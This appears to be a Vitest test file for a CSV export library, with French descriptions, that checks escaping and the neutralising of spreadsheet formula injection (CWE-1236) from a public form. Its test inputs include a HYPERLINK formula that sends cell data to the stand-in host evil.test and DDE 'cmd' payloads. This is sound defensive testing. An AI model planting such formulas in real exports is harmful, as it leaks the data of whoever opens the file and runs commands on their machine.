import { describe, expect, it } from 'vitest';
import { escapeCsvCell, safeFilename, toCsv } from '../src/lib/csv';

describe('csv Excel-friendly', () => {
  it('échappe les séparateurs, guillemets et retours ligne', () => {
    expect(escapeCsvCell('a;b')).toBe('"a;b"');
    expect(escapeCsvCell('dit "bonjour"')).toBe('"dit ""bonjour"""');
    expect(escapeCsvCell('ligne1\nligne2')).toBe('"ligne1\nligne2"');
    expect(escapeCsvCell(null)).toBe('');
    expect(escapeCsvCell(undefined)).toBe('');
    expect(escapeCsvCell(42)).toBe('42');
  });

  it('préfixe un BOM UTF-8 et sépare par point-virgule', () => {
    const out = toCsv(['nom', 'email'], [['Léa', 'lea@test.com'], ['A;B', 'x@y.z']]);
    expect(out.startsWith('\uFEFF')).toBe(true);
    expect(out).toContain('nom;email');
    expect(out).toContain('Léa;lea@test.com');
    expect(out).toContain('"A;B";x@y.z');
  });

  it('normalise les noms de fichier', () => {
    expect(safeFilename('Festival Été 2026!')).toMatch(/^Festival/);
    expect(safeFilename('a/b\\c')).not.toContain('/');
  });
});

describe('SEC-02 — injection de formules dans les exports (CWE-1236)', () => {
  /**
   * Le prénom, le nom, le média et le message proviennent du formulaire
   * d'accréditation PUBLIC : un attaquant non authentifié y dépose une formule
   * qui s'exécute quand l'organisateur ouvre l'export dans son tableur.
   */
  it('neutralise les amorces de formule (= + - @ tabulation)', () => {
    // Cellule guillemetée (elle contient des `"`) : l'apostrophe protège
    // l'intérieur, là où le tableur lira le contenu après avoir retiré les guillemets.
    expect(escapeCsvCell('=HYPERLINK("https://evil.test/?d="&A1,"Voir")')).toBe(
      '"\'=HYPERLINK(""https://evil.test/?d=""&A1,""Voir"")"',
    );
    expect(escapeCsvCell('@SUM(1+1)')).toBe("'@SUM(1+1)");
    expect(escapeCsvCell('+cmd|\'/c calc\'!A1')).toBe('\'+cmd|\'/c calc\'!A1');
    expect(escapeCsvCell('-2+3+cmd|x')).toBe("'-2+3+cmd|x");
    expect(escapeCsvCell('\tDDE')).toBe("'\tDDE");
  });

  it('le guillemetage RFC 4180 seul ne suffisait pas : la neutralisation reste dans la cellule', () => {
    // La cellule contient un `;` → elle est guillemetée. Le tableur retire les
    // guillemets avant d'évaluer : l'apostrophe doit être À L'INTÉRIEUR.
    expect(escapeCsvCell('=A1;B1')).toBe('"\'=A1;B1"');
  });

  it('laisse intactes les valeurs légitimes (téléphones, nombres, dates)', () => {
    expect(escapeCsvCell('+33 6 12 34 56 78')).toBe('+33 6 12 34 56 78');
    expect(escapeCsvCell('-5')).toBe('-5');
    expect(escapeCsvCell(-5)).toBe('-5');
    expect(escapeCsvCell('2026-09-07T10:00:00.000Z')).toBe('2026-09-07T10:00:00.000Z');
    expect(escapeCsvCell('Léa')).toBe('Léa');
  });

  it('protège toutes les lignes d’un document, pas seulement l’en-tête', () => {
    const out = toCsv(['prenom', 'email'], [['=1+1', 'a@b.c']]);
    expect(out).toContain("'=1+1;a@b.c");
    expect(out).not.toContain('\r\n=1+1');
  });
});
